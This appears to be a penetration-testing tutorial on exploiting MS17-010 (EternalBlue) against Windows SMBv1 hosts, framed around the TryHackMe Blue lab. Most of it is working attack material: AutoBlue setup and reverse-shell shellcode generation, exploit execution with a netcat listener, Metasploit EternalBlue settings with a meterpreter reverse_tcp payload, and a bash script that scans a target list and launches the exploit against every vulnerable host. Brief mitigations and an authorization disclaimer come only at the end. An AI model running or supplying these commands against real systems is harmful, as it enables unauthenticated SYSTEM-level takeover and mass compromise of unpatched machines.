# MS17-010 (EternalBlue) Exploitation

## Overview

MS17-010, commonly known as "EternalBlue," is a collection of Windows vulnerabilities that allow remote code execution through the Server Message Block (SMB) protocol. This vulnerability affects SMBv1 and was originally developed by the NSA before being leaked by the Shadow Brokers hacker group in 2017.

**Key Characteristics:**

- Remote code execution without authentication
- Provides SYSTEM-level privileges (no privilege escalation needed)
- Affects multiple Windows versions (Windows 7 through Windows Server 2012 R2)
- Was weaponized in the WannaCry ransomware attacks

## Affected Systems

- Windows Vista
- Windows 7
- Windows 8.1
- Windows 10 (specific builds)
- Windows Server 2008
- Windows Server 2012
- Windows Server 2016 (specific builds)

**Note:** Microsoft released patches in March 2017, but many unpatched systems remain vulnerable.

## Lab Environment

For practical testing, use the **TryHackMe Blue Machine**:

- **Lab URL**: [TryHackMe Blue Room](https://tryhackme.com/room/blue)
- **Access**: Free account required
- **Credentials**: Not required - machine starts automatically
- **Difficulty**: Easy
- **Note**: This is a intentionally vulnerable machine for educational purposes

## Detection Methods

### Nmap Vulnerability Scanning

```bash
# Basic SMB detection
nmap -p 445 --script smb-os-discovery <TARGET_IP>

# MS17-010 vulnerability check
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>
```

**Example Output:**

```
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

## Manual Exploitation with AutoBlue

### Setup and Dependencies

```bash
# Clone the exploit repository
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010

# Install Python dependencies
pip install -r requirements.txt

# Navigate to shellcode directory
cd shellcode
```

### Shellcode Generation

```bash
# Make the shellcode preparation script executable
chmod +x shell_prep.sh

# Generate shellcode
./shell_prep.sh
```

**Interactive Setup Example:**

```
[*] Kernel shellcode compiled. Would you like to auto generate a reverse shell with MSFVenom? (Y/n): Y
[+] LHOST: 10.10.10.10
[+] LPORT: 4444
[+] Generating x64 reverse shell...
[+] Shellcode generation complete!
```

### Exploitation Execution

```bash
# Navigate back to main directory
cd ..

# Set execute permissions on exploit
chmod +x eternalblue_exploit7.py

# Run the exploit
python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
```

**Successful Exploitation Output:**

```
[+] Target OS: Windows Server 2008 R2
[+] SMB session setup allocate non-paged pool success
[+] SMB session setup allocate non-paged pool success
[+] SMB session setup allocate non-paged pool success
[+] SMB session setup allocate non-paged pool success
[+] SMB session setup allocate non-paged pool success
[+] Done
```

### Listener Setup

```bash
# Set up netcat listener (in separate terminal)
nc -nvlp 4444
```

**Successful Connection Output:**

```
Connection from 10.10.10.12:49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Automated Exploitation with Metasploit

### Metasploit Framework Usage

```bash
# Start Metasploit
msfconsole

# Search for EternalBlue modules
search eternalblue

# Use the exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Configure options
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT 4444

# Execute exploit
exploit
```

### Advanced Metasploit Usage

```bash
# Use the auxiliary scanner first
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

# If vulnerable, proceed with exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444

# Advanced: Set target automatically
set TARGET 0

# Run with verbose output
set VERBOSE true
exploit
```

**Successful Meterpreter Session:**

```
[*] Started reverse TCP handler on 10.10.10.10:4444
[*] 10.10.10.12:445 - Connecting to target for exploitation.
[+] 10.10.10.12:445 - Connection established for exploitation.
[+] 10.10.10.12:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.12:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.12:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.10.10.12:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard
[*] 10.10.10.12:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[+] 10.10.10.12:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[+] 10.10.10.12:445 - Trying exploit with 12 Groom Allocations.
[+] 10.10.10.12:445 - Sending all but last fragment of exploit packet
[+] 10.10.10.12:445 - Starting non-paged pool grooming
[+] 10.10.10.12:445 - Sending SMBv2 buffers
[+] 10.10.10.12:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[+] 10.10.10.12:445 - Sending final SMBv2 buffers.
[+] 10.10.10.12:445 - Sending last fragment of exploit packet!
[+] 10.10.10.12:445 - Receiving response from exploit packet
[+] 10.10.10.12:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[+] 10.10.10.12:445 - Signing and sending the final exploit packet!
[*] 10.10.10.12:445 - Waiting for 60 seconds for shell to connect...
[*] Sending stage (200262 bytes) to 10.10.10.12
[*] Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.12:49159) at 2024-01-15 10:30:45 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Advanced Practical Example

### Multi-target Scanning and Exploitation

```bash
#!/bin/bash
# multi_target_eternalblue.sh

TARGET_FILE="targets.txt"
RESULTS_FILE="vulnerable_hosts.txt"

# Scan multiple targets for vulnerability
echo "[*] Scanning targets for MS17-010 vulnerability..."
while read target; do
    echo "[*] Scanning $target"
    result=$(nmap -p 445 --script smb-vuln-ms17-010 $target | grep "VULNERABLE")

    if [[ ! -z "$result" ]]; then
        echo "[+] $target is VULNERABLE"
        echo $target >> $RESULTS_FILE
    else
        echo "[-] $target is not vulnerable"
    fi
done < $TARGET_FILE

# Exploit vulnerable hosts
echo "[*] Exploiting vulnerable hosts..."
while read vulnerable_host; do
    echo "[*] Attempting exploitation of $vulnerable_host"

    # Generate unique payload for each target
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=5555 -f raw -o /tmp/shellcode_$vulnerable_host.bin

    # Execute exploit
    python eternalblue_exploit7.py $vulnerable_host /tmp/shellcode_$vulnerable_host.bin &

done < $RESULTS_FILE
```

### Defensive Considerations

**Mitigation Strategies:**

1. Apply Microsoft security updates from March 2017 or later
2. Disable SMBv1 protocol
3. Implement network segmentation
4. Use host-based firewalls to restrict SMB traffic
5. Deploy intrusion detection systems monitoring for EternalBlue patterns

**Detection Signatures:**

- Unusual SMB traffic patterns
- Multiple connection attempts to port 445
- Processes running as SYSTEM from SMB context

## Important Notes

- Only use these techniques in authorized environments
- The TryHackMe Blue machine is specifically designed for this exercise
- Always obtain proper authorization before testing
- Many real-world systems remain unpatched despite patch availability
- This exploit provides immediate SYSTEM privileges, making post-exploitation activities straightforward

## References

- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [AutoBlue-MS17-010 GitHub](https://github.com/3ndG4me/AutoBlue-MS17-010)
- [TryHackMe Blue Room](https://tryhackme.com/room/blue)
